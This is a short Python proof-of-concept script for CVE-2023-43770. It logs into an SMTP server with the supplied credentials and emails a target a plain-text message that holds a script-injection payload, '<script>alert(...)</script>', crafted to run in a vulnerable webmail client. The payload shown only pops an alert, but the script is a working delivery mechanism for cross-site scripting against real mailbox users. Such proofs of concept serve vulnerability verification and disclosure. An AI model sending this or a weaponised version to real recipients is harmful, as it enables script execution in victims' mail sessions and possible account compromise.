import smtplib
import argparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2023-43770 POC")
    parser.add_argument("-e", "--sender_email", required=True, help="Sender's email address")
    parser.add_argument("-p", "--sender_password", required=True, help="Sender's email password")
    parser.add_argument("-t", "--recipient_email", required=True, help="Recipient's email address")
    parser.add_argument("-sh", "--smtp_host", default="smtp.gmail.com", help="SMTP host address")
    parser.add_argument("-sp", "--smtp_port", default=587, help="SMTP port number")

    args = parser.parse_args()

    msg = MIMEMultipart()
    msg["From"] = args.sender_email
    msg["To"] = args.recipient_email
    msg["Subject"] = "CVE-2023-43770 POC"

    message = "\n[<script>alert('CVE-2023-43770 POC')</script>]\n";

    msg.attach(MIMEText(message, "plain"))

    try:
        server = smtplib.SMTP(args.smtp_host, args.smtp_port)
        server.starttls()
        server.login(args.sender_email, args.sender_password)
        server.sendmail(args.sender_email, args.recipient_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print("An error occurred:", str(e))
